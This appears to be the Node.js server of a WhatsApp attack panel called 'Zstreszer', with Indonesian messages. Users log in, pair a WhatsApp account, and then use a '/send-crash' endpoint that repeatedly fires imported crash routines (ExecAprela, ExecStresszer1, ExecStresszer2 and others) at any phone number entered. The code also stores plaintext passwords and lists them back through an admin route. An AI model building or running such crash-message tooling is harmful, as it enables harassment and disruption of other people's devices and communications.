require('./config');
const express = require('express');
const session = require('express-session');
const path = require('path');
const fs = require('fs-extra');
//============
//WHATSAPP
global.clientSessions = {};
global.connectedClients = [];
const { StartSession, removeSessionFolder } = require('./database/lib/makesocket');
const autoStartAllSessions = require('./database/lib/loadsesi');
const sessionFolderPath = path.join(__dirname, '../sessions');
if (global.startallsesi) {
autoStartAllSessions();
}
//============
//FUNC
const { 
overloadButtonGC, 
ExecStresszer1, 
ExecStresszer2, 
ExecAprela, 
ExecVialet, 
ExecAlbumInvis,
ExecAlbum
} = require('./database/lib/Xstres');
//============
const {sleep, parseInterval, runtime, loadDatabase, saveDatabase } = require('./database/lib/LoadDB');
const {getDeviceInfo, requireOwner, preventLoginIfLoggedIn, requireLogin, resetUsageAll, checkLimit } = require('./database/lib/ServerF');
global.db = loadDatabase();
//============
//Server
const app = express();
const PORT = global.port;
app.use((req, res, next) => {
console.log(`[ PESAN ] ${req.method} ${req.url}`);
next();
});
//============
app.use(session({
secret: 'Kagenou-Ganteng',
resave: false,
saveUninitialized: true,
cookie: { secure: false }
}));
//============
app.use(express.json());
const publicFolder = path.join(__dirname, 'public');
app.use((req, res, next) => {
if (req.path.endsWith(".html") && !req.session.loggedIn) {
return res.redirect("/");
}
next();
});
app.use(express.static(path.join(__dirname, 'public')));
//============
//APIS SERVER
app.post('/auth', async (req, res) => {
const { email, password } = req.body;
const userEntry = Object.entries(global.db.users).find(([username, user]) => 
(user.email === email || username === email) && user.password === password
);
if (userEntry) {
const [username, user] = userEntry;
req.session.loggedIn = true;
req.session.email = user.email;
req.session.username = username;
req.session.role = user.role;
if (!global.clientSessions[username] || !global.clientSessions[username].user) {
await StartSession(username);
}
return res.json({ success: true });
}
if (email === global.username && password === global.password) {
req.session.loggedIn = true;
req.session.email = email;
req.session.username = email; 
req.session.role = 'owner'; 
if (!global.clientSessions[username] || !global.clientSessions[username].user) {
await StartSession(username);
}
return res.json({ success: true });
}
return res.status(401).json({ success: false, message: 'Email atau password salah!' });
});
//============
app.get('/auth/info', requireLogin, (req, res) => {
const email = req.session.email;
const users = global.db?.users || {};
const user = Object.values(users).find(u => u.email === email);
if (email === global.username) {
return res.json({ email, role: "owner" });
}
if (!user) {
return res.status(404).json({ error: "User tidak ditemukan", redirect: '/'});
}
if (user.role !== 'owner') {
if (req.headers.accept?.includes('application/json')) {
return res.status(403).json({ warning: "Akses ditolak. Hanya owner yang diizinkan", redirect: '/' });
}}
return res.json({ email, role: user.role });
});
//============
app.post('/logout', async (req, res) => {
if (!req.session.loggedIn) return res.status(403).send('Forbidden');
const username = req.session.username;
if (global.clientSessions[username]) {
try {
global.clientSessions[username].end(); 
delete global.clientSessions[username];
console.log(`[${username}] Koneksi dihentikan.`);
} catch (err) {
console.error(`Gagal hentikan koneksi ${username}:`, err);
}}
req.session.destroy(() => {
res.redirect('/');
});
});
//============
app.post('/create-user', requireLogin, requireOwner, (req, res) => {
let { username, password, role } = req.body;
username = username?.toLowerCase()?.trim();
password = password?.trim();
role = role?.toLowerCase();
if (!username || !password || !role) {
return res.status(400).json({ error: "Lengkapi semua data" });
}
if (global.db.users[username]) {
return res.status(409).json({ error: "User sudah ada" });
}
const generateApiKey = (length = 10) => {
const chars = 'ABCDFGIJKSTXYZabcdefghnouvwxyz0123656789';
return Array.from({ length }, () => chars[Math.floor(Math.random() * chars.length)]).join('');
};
const apiKey = `Zstres${generateApiKey(10)}`;
const email = `${username}@Zstres.my`;
global.db.users[username] = {
email,
password,
role,
apiKey,
usage: 0
};
saveDatabase(global.db);
res.json({
success: true,
message: "User berhasil dibuat",
apiKey,
role,
password,
email
});
});
//============
app.post('/delete-user', requireLogin, requireOwner, async (req, res) => {
const { email } = req.body;
if (!email) return res.status(400).json({ error: "Email diperlukan" });
const userEntry = Object.entries(global.db.users).find(
([username, user]) => user.email === email
);
if (!userEntry) {
return res.status(404).json({ error: "User tidak ditemukan", redirect: '/' });
}
const [username] = userEntry;
const isSelfDelete = req.session.email === email;
delete global.db.users[username];
await removeSessionFolder(path.join(sessionFolderPath, username), username);
saveDatabase(global.db);
if (isSelfDelete) {
req.session.destroy(() => {
return res.json({ success: true, message: "Akun Anda berhasil dihapus.", redirect: '/' });
});
} else {
return res.json({ success: true, message: `User ${email} berhasil dihapus` })}});
//============
app.get('/list-users', requireLogin, requireOwner, (req, res) => {
try {
const users = Object.entries(global.db.users).map(([username, user]) => ({
username,
email: user.email || '-',
password: user.password || '-',
role: user.role || 'user',
apikey: user.apiKey || 'memek',
usage: user.usage || 0
}));
res.json({ users });
} catch (e) {
console.error('Gagal mendapatkan daftar pengguna:', e);
res.status(500).json({ error: 'Terjadi kesalahan' });
}
});
//============
app.get('/device-info', requireLogin, (req, res) => {
const info = getDeviceInfo();
res.json(info);
});
//============
//ROUTE
app.get('/', preventLoginIfLoggedIn, (req, res) => {
res.sendFile(path.join(__dirname, 'public/login/acces.html'));
});
//============
app.get('/dashboard', requireLogin, (req, res) => {
res.sendFile(path.join(__dirname, 'public/dashboard/home.html'));
});
//============
app.get('/cadmin', requireLogin, requireOwner, (req, res) => {
res.sendFile(path.join(__dirname, 'public/cadmin/own.html'));
});
//============
app.get('/bugmenu', requireLogin, (req, res) => {
res.sendFile(path.join(__dirname, 'public/bugmenu/combat.html'));
});
//============
//WA APIS
app.get('/status-wa', (req, res) => {
const username = req.session.username;
const zstres = global.clientSessions[username];
if (zstres && zstres.user) {
return res.status(200).json({ connected: true });
} else {
return res.status(200).json({ connected: false });
}});
//============
app.get('/api/connected', requireLogin, requireOwner, async (req, res) => {
const data = global.connectedClients.map(client => {
const id = client.id;
const pushName = client.name || id;
return {username: client.username,id,pushName}});
return res.status(200).json({success: true,total: data.length,data
})});
//============
app.post('/api/logoutwa', requireLogin, requireOwner, async (req, res) => {
const { jid } = req.body;
if (!jid) {
return res.status(400).json({success: false,message: 'JID tidak disediakan.'});
}
const index = global.connectedClients.findIndex(c => c.id === jid);
if (index === -1) {
return res.status(404).json({success: false,message: 'User tidak ditemukan atau sudah logout.'});
}
const username = global.connectedClients[index].username;
const session = global.clientSessions[username];
try {
if (session && typeof session.logout === 'function') {
await session.logout();
}
delete global.clientSessions[username];
global.connectedClients.splice(index, 1);
await removeSessionFolder(path.join(sessionFolderPath, username), username);
return res.status(200).json({success: true,message: `Berhasil logout dari ${jid}`});
} catch (error) {
console.error('Logout Error:', error);
return res.status(500).json({success: false,message: 'Gagal logout. Coba lagi nanti.'});
}});
//============
app.post('/connect', requireLogin, checkLimit, async (req, res) => {
const username = req.session.username;
const zstres = global.clientSessions[username];
try {
if (!zstres) {
return res.status(500).json({ error: 'Instance WhatsApp belum siap' });
}
const { nomor } = req.body;
if (!nomor) {
return res.status(400).json({ error: 'Nomor wajib diisi' });
}
const code = await zstres.requestPairingCode(nomor.trim());
return res.json({ code });
} catch (err) {
console.error('Gagal request pairing', err);
return res.status(500).json({ error: 'Gagal request pairing' });
}
});
//============
app.post('/send-crash', requireLogin, checkLimit, async (req, res) => {
const username = req.session.username;
const zstres = global.clientSessions[username];
try {
const { nomor, type } = req.body;
if (!nomor || !type) {
return res.status(400).json({ error: 'Nomor dan type wajib diisi' });
}
if (!zstres || !zstres.user) {
return res.status(400).json({ error: 'WhatsApp belum terhubung!' });
}
const target = nomor.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
res.json({ success: true });
switch (type) {
case "testsend":
await zstres.sendMessage(target, { text: `> Zstreszer Always On` });
break;
case 'Aprela Invis':
for (let i = 0; i < 10; i++) {
await ExecAprela(target, zstres);
await sleep(5000);
await ExecAprela(target, zstres);
}
break;
case 'Violet Invis':
for (let i = 0; i < 12; i++) {
await ExecVialet(target, zstres);
await sleep(6000);
await ExecVialet(target, zstres);
}
break;
case 'Album Invis':
await ExecAlbumInvis(target, zstres);
await sleep(10000);
await ExecAlbumInvis(target, zstres);
await sleep(10000);
await ExecAlbumInvis(target, zstres);
break;
case 'ZstreszerV1':
for (let i = 0; i < 15; i++) {
await ExecStresszer1(target, zstres);
await sleep(8000);
await ExecStresszer1(target, zstres);
}
break;
case 'ZstreszerV2':
for (let i = 0; i < 16; i++) {
await ExecStresszer2(target, zstres);
await sleep(8000);
await ExecStresszer2(target, zstres);
await sleep(8000);
await ExecStresszer2(target, zstres);
}
break;
default:
break;
}
} catch (err) {
console.error('[SEND MESSAGE ERROR]', err);
res.status(500).json({ error: 'Gagal mengirim pesan' });
}
});
//============
app.use((req, res, next) => {
const notFoundPage = path.join(publicFolder, '404.html');
if (fs.existsSync(notFoundPage)) {
res.status(404).sendFile(notFoundPage);
} else {
res.status(404).send('404 - Not Found');
}
});
//============
app.use((err, req, res, next) => {
console.error(`[ERROR] ${err.stack}`);
res.status(500).send('500 - Server Error');
next();
});
//============
console.log(`███████╗████████╗██████╗ ███████╗███████╗███████╗  
╚══███╔╝╚══██╔══╝██╔══██╗██╔════╝██╔════╝██╔════╝  
  ███╔╝    ██║   ██████╔╝█████╗  ███████╗███████╗  
 ███╔╝     ██║   ██╔══██╗██╔══╝  ╚════██║╚════██║  
███████╗   ██║   ██║  ██║███████╗███████║███████║  
╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝`)  
app.listen(PORT, () => {  
console.log(`Server running on http://localhost:${PORT}`)});  
